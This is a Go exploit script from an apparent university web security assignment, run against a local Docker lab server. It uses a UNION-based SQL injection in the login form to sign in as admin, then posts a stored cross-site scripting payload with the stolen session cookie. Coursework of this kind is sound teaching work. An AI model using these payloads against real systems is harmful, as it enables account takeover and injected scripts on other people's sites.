// COMP90074 Web Security Assignment 1 Client Exploit Code
// Student Name: Quanchi Chen
// Student ID Number: 1358474

package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"strings"
)

var serverHost = "host.docker.internal"
var cookie *http.Cookie

func main() {
	signUp()
	logIn()
	post()
	logOut()
}

// Register a new user.
func signUp() {
	params := url.Values{}
	params.Add("username", "quanchic")
	params.Add("phone", "0478275727")
	params.Add("password", "quanchic")

	_, err := http.PostForm(fmt.Sprintf("http://%v/signup", serverHost), params)
	if err != nil {
		log.Fatal(err)
	}
}

// Log in as the administrator by exploiting the SQL injection vulnerability.
func logIn() {
	params := url.Values{}
	params.Add("username", "' AND 1=0 UNION SELECT 'admin', (SELECT password FROM users WHERE\nusername='quanchic') --")
	params.Add("password", "quanchic")

	req, err := http.NewRequest("POST", fmt.Sprintf("http://%v/login", serverHost), strings.NewReader(params.Encode()))
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

	client := &http.Client{
		// Disable redirect.
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	resp, err := client.Do(req)

	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {
			log.Fatal(err)
		}
	}(resp.Body)

	// Extract the cookie from the response.
	cookie = resp.Cookies()[0]
}

// Post malicious JavaScript code to the server.
func post() {
	params := url.Values{}
	params.Add("msg", "<script>alert('This site has been hacked!')</script>")

	req, err := http.NewRequest("POST", fmt.Sprintf("http://%v/post", serverHost), strings.NewReader(params.Encode()))
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.AddCookie(cookie)

	client := &http.Client{}
	_, err = client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
}

// Log out.
func logOut() {
	_, err := http.Get(fmt.Sprintf("http://%v/logout", serverHost))
	if err != nil {
		log.Fatal(err)
	}
}
